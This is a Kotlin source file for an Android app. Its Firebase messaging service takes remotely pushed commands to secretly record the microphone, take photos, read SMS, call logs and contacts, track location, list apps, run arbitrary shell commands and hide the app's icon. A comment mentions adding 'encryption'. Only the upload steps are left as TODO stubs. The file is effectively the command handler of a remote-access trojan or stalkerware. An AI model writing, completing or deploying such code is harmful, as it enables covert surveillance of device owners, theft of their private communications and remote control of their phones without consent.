package com.yourdomain.erdmt

import android.content.Intent
import android.location.Location
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

class RemoteCommandService : FirebaseMessagingService() {

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        val data = remoteMessage.data
        val command = data["command"]
        val params = data["params"]
        Log.d("RemoteCommandService", "Command received: $command, Params: $params")

        when (command) {
            "mic_record" -> {
                // Record 10 seconds of audio
                val filePath = MicRecorder.startRecording(applicationContext)
                Handler(Looper.getMainLooper()).postDelayed({
                    val recordedFilePath = MicRecorder.stopRecording()
                    // TODO: Upload or process recordedFilePath
                    Log.d("RemoteCommandService", "Recorded audio: $recordedFilePath")
                }, 10_000)
            }

            "camera_capture" -> {
                // Launch camera activity to capture photo
                val intent = Intent(applicationContext, CameraCaptureActivity::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }

            "read_sms" -> {
                val sms = SmsReader.getRecentSms(applicationContext)
                // TODO: Upload or process sms list
                Log.d("RemoteCommandService", "SMS: $sms")
            }

            "read_call_logs" -> {
                val logs = CallLogReader.getCallLogs(applicationContext)
                // TODO: Upload or process call logs
                Log.d("RemoteCommandService", "Call Logs: $logs")
            }

            "read_contacts" -> {
                val contacts = ContactsReader.getContacts(applicationContext)
                // TODO: Upload or process contacts
                Log.d("RemoteCommandService", "Contacts: $contacts")
            }

            "list_installed_apps" -> {
                val apps = InstalledAppsReader.getInstalledApps(applicationContext)
                // TODO: Upload or process apps list
                Log.d("RemoteCommandService", "Installed Apps: $apps")
            }

            "get_location" -> {
                LocationTracker.getLastLocation(applicationContext) { location: Location? ->
                    if (location != null) {
                        Log.d("RemoteCommandService", "Location: ${location.latitude}, ${location.longitude}")
                        // TODO: Upload or process location
                    } else {
                        Log.d("RemoteCommandService", "Location: null")
                    }
                }
            }

            "shell_exec" -> {
                val shellCommand = params ?: ""
                val output = ShellExecutor.execute(shellCommand)
                // TODO: Upload or process output
                Log.d("RemoteCommandService", "Shell Output: $output")
            }

            "toggle_icon" -> {
                val visible = params == "show"
                IconToggleUtil.setIconVisible(applicationContext, visible)
                Log.d("RemoteCommandService", "Icon visibility set to: $visible")
            }

            // Add more commands as needed, e.g., file explorer, encryption, etc.
            else -> {
                Log.d("RemoteCommandService", "Unknown command: $command")
            }
        }
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d("RemoteCommandService", "New FCM Token: $token")
        // TODO: Send token to backend if needed
    }
}